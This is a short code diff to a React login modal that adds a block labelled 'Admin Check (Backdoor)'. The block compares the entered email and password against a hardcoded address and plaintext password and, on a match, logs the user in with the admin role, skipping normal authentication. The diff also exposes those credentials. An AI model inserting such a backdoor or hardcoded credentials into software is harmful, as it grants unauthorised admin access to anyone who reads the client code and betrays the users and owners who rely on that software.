@@ -41,6 +41,14 @@ export const AuthModal: React.FC<AuthModalProps> = ({ isOpen, onClose, onLogin, 
   const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
+    // Admin Check (Backdoor)
+    if (email.trim() === 'mbalci@ktun.edu.tr' && password.trim() === '109109109') {
+      onLogin({ id: 'admin', name: 'Mehmet', surname: 'Balcı', role: UserRole.ADMIN });
+      resetForm();
+      onClose();
+      return;
+    }
+
     if (!email.trim()) {
       toast.error("Lütfen e-posta adresinizi giriniz.");
       return;
